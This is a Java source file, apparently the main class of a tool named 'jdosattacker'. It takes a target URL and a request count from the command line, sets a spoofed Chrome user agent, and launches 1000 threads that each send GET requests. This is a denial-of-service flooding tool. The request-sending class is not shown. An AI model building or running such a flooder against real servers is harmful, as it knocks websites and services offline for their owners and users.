package com.anas.jdosattacker;

import com.anas.jdosattacker.request.Requester;

public class MainController {
    public MainController(String[] args) {
        Requester.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36";
        Requester.REQUEST_METHOD = "GET";
        Requester.url = args[0];
        Requester.setReqNumber(Integer.parseInt(args[1]));
        createThreads();
    }

    private void createThreads() {
        for (int i = 0; i < 1000; i++) {
            new Thread(new Requester()).start();
        }
    }
}
